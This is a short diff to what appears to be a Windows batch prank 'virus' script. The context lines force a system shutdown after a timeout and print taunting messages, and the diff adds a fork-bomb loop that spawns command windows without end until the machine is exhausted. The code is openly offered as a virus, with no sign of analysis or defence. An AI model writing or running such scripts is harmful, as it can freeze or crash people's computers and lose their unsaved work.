@@ -7,3 +7,6 @@ timeout 60
 shutdown -s
 echo This is 100% real. Thanks for making this virus: L0:3E
 pause Press any key to kill your pc.
+:crash
+start
+goto crash
